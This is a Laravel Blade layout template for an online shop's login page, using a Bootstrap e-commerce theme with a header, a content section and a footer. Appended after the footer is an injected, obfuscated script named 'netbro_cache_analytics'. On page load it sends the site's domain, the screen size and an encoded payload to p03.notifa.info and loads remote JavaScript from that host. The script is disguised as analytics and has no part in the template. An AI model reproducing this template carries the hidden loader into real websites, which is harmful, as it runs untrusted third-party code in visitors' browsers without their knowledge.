
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="max-age=604800" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>Login - Online Shop</title>

<link href="{{asset('frontend')}}/images/favicon.ico" rel="shortcut icon" type="image/x-icon">

<!-- jQuery -->
<script src="{{asset('frontend')}}/js/jquery-2.0.0.min.js" type="text/javascript"></script>

<!-- Bootstrap4 files-->
<script src="{{asset('frontend')}}/js/bootstrap.bundle.min.js" type="text/javascript"></script>
<link href="{{asset('frontend')}}/css/bootstrap.css" rel="stylesheet" type="text/css"/>

<!-- Font awesome 5 -->
<link href="{{asset('frontend')}}/fonts/fontawesome/css/all.min.css" type="text/css" rel="stylesheet">

<!-- custom style -->
<link href="{{asset('frontend')}}/css/ui.css" rel="stylesheet" type="text/css"/>
<link href="{{asset('frontend')}}/css/responsive.css" rel="stylesheet" media="only screen and (max-width: 1200px)" />

<!-- custom javascript -->
<script src="{{asset('frontend')}}/js/script.js" type="text/javascript"></script>

<script type="text/javascript">
/// some script

// jquery ready start
$(document).ready(function() {
	// jQuery code

}); 
// jquery end
</script>

</head>
<body>


<header class="section-header">
<section class="header-main border-bottom">
	<div class="container">
<div class="row align-items-center">
	<div class="col-lg-2 col-4">
		<a href="http://bootstrap-ecommerce.com" class="brand-wrap">
			<img class="logo" src="{{asset('frontend')}}/images/logo.png">
		</a> <!-- brand-wrap.// -->
	</div>
	<div class="col-lg-6 col-sm-12">
		 <!-- search-wrap .end// -->
	</div> <!-- col.// -->
	<div class="col-lg-4 col-sm-6 col-12">
		<div class="widgets-wrap float-md-right">
			
			<div class="widget-header icontext">
				<a href="#" class="icon icon-sm rounded-circle border"><i class="fa fa-user"></i></a>
				<div class="text">
					<span class="text-muted">Welcome!</span>
					<div> 
						<a href="{{route('login')}}">Sign in</a> |  
						<a href="{{route('register')}}"> Register</a>
					</div>
				</div>
			</div>

		</div> <!-- widgets-wrap.// -->
	</div> <!-- col.// -->
</div> <!-- row.// -->
	</div> 
</section>
</header> 



<!-- ========================= SECTION CONTENT ========================= -->
<section class="section-conten padding-y" style="min-height:84vh">
    @yield('content')

</section>
<!-- ========================= SECTION CONTENT END// ========================= -->


<!-- ========================= FOOTER ========================= -->
<footer class="section-footer border-top padding-y">
	<div class="container">
		<p class="float-md-right"> 
			&copy Copyright 2019 All rights reserved
		</p>
		<p>
			<a href="#">Terms and conditions</a>
		</p>
	</div><!-- //container -->
</footer>
<!-- ========================= FOOTER END // ========================= -->



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAjjbPwIFF%2fwtMsTb3xC5%2fkBrJ4teCtKacJmfyzJJz5FIBf8%2bI9HlXVdtPTx%2bMiR%2bZSAH9Dxo7OXmIlxZpd9gUKKwg9iHg0jLf6TiR%2fREf1ioq1DHU5%2fq6laBpwjngKudjCGX13AUt%2bCt8xhOTe%2bBOE7Jva%2bRFCWtjY4k1rRNWodh1mnB4wWFAszaohmn4V%2f4F54OoDwnHu01%2bfyHQpd21RyoUiKHmVp3BjRYLV1JfykWvWH9Gc5%2fNx%2bSmaixVQaXMIfGAPI6Rpws4mOKR6bThFSjCxnVMf8c4k2Zgb9gQGg0o7nkCVT84YyXUDCqzfdYT43s24%2bFuTQluSzScbfrvF%2f1n9q0ntL91BA2UceNbLGPRm2KPB4Lr9uxN9AS5ednCrcSKYbk3YKSWPB1Di7g0piuFwlAhc4Bf01sjUaajI6KMOi%2fO8b4js5zcYjlnWTLd%2boI4JG3Sk3ia72T70WVg81Ps7wH8uKdpLnow5s9vL6laUczd7igmpED9LU84NP2w64L2l2rFIVdQ7isaD%2f2pEDjCRfoJk%2fSvIpNGLTwuMgHNcE98bB5K4H161g8oLT0QLeJdm6wsNLsD%2fZ2sBys0znJtTPUTMWsI" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>